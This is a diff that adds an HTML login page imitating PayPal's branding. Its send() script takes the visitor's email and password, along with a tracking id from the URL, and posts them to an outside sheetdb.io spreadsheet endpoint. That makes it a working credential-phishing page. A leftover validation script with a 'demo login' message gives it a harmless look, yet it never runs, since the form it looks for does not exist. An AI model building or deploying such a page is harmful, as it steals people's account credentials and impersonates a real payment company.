@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pay Login</title>
+
+<style>
+  :root {
+    --bg: #f2f3f5;
+    --text: #1a1a1a;
+    --muted: #6b7280;
+    --accent: #0070ba;     /* PayPal-like blue tone */
+    --accent-dark: #005c97;
+    --radius: 10px;
+  }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    font-family: system-ui, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+    color: var(--text);
+  }
+
+  .card {
+    width: 100%;
+    max-width: 380px;
+    background: #fff;
+    padding: 32px;
+    border-radius: var(--radius);
+    box-shadow: 0 0 20px rgba(0,0,0,0.08);
+    border: 1px solid rgba(0,0,0,0.05);
+    text-align: center;
+  }
+
+  .logo-placeholder {
+    width: 52px;
+    height: 52px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #e5f3ff, #cfe8ff);
+    display: grid;
+    place-items: center;
+    margin: 0 auto 16px;
+    border: 1px solid rgba(0,0,0,0.1);
+  }
+
+  .logo-placeholder svg {
+    width: 28px;
+    height: 28px;
+    fill: var(--accent);
+  }
+
+  h1 {
+    margin: 0 0 8px;
+    font-size: 24px;
+    font-weight: 600;
+  }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 22px;
+  }
+
+  .input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #d1d5db;
+    border-radius: var(--radius);
+    font-size: 15px;
+    margin-bottom: 16px;
+  }
+
+  .input:focus {
+    outline: none;
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(0,112,186,0.25);
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    border: none;
+    background: var(--accent);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    margin-top: 10px;
+    cursor: pointer;
+  }
+
+  .btn:active {
+    background: var(--accent-dark);
+    transform: translateY(1px);
+  }
+
+  .link {
+    display: block;
+    margin-top: 18px;
+    color: var(--accent);
+    font-size: 14px;
+    text-decoration: none;
+  }
+
+  .error {
+    color: #d93025;
+    font-size: 13px;
+    margin-top: -12px;
+    display: none;
+    margin-bottom: 10px;
+  }
+</style>
+</head>
+
+<body>
+<div class="card">
+
+<h1 style="color: dodgerblue;"><i>Paypal</i></h1>
+
+  <h4>Log In</h4>
+  <div class="subtitle">Access your account</div>
+
+  
+    <input type="email" id="email" class="input" placeholder="Email" />
+    <div id="emailErr" class="error">Enter a valid email address.</div>
+
+    <input type="password" id="password" class="input" placeholder="Password" />
+    <div id="passErr" class="error">Password must be at least 4 characters.</div>
+
+    <button onclick="send()" class="btn" type="submit">Log In</button>
+  
+  
+  
+  
+  
+  
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "paypal";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+          
+  
+  
+  
+  
+  
+  
+  
+
+  <a href="#" class="link">Forgot your password?</a>
+</div>
+
+<script>
+  const form = document.getElementById("payForm");
+  const email = document.getElementById("email");
+  const pass = document.getElementById("pass");
+  const emailErr = document.getElementById("emailErr");
+  const passErr = document.getElementById("passErr");
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    emailErr.style.display = "none";
+    passErr.style.display = "none";
+
+    let ok = true;
+
+    if (!email.value.includes("@")) {
+      emailErr.style.display = "block";
+      ok = false;
+    }
+
+    if (pass.value.length < 4) {
+      passErr.style.display = "block";
+      ok = false;
+    }
+
+    if (!ok) return;
+
+    alert("Demo login successful. Connect this form to your backend API.");
+  });
+</script>
+
+</body>
+</html>
